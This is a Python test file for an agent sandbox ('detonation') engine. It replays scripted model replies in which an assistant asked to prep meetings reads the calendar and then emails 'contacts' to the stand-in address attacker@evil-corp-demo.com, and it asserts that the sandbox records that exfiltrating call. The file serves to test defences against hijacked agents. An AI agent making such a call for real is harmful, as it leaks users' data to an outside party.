"""An SDK agent detonated in the engine's real jailed child: runner = mirage.sandbox:run."""

from langchain_core.messages import messages_to_dict

from agents.common.testing import call
from engine.detonation.sandbox import run_once
from engine.gateway import gate

ATTACKER = "attacker@evil-corp-demo.com"


def test_sdk_agent_replays_to_the_freeze_in_the_jail():
    replies = [call("read_calendar"), call("send_email", to=ATTACKER, body="contacts")]
    snap = {
        "agent": "assistant", "task": "Prep my meetings", "runner": gate.SDK_RUNNER,
        "entrypoint": "sdk.tests.e2e_agent:factory",
        "model_calls": [{"model_id": "fake", "request": {},
                         "response": {"messages": messages_to_dict([m])}} for m in replies],
        "tool_results": [{"call_id": "call_1", "tool": "read_calendar", "args": {},
                          "result": [{"title": "Q4 sync"}]}],
    }
    effects, error = run_once(snap)
    assert error is None
    assert [(e["tool"], e["args"].get("to")) for e in effects] == [
        ("read_calendar", None), ("send_email", ATTACKER)]
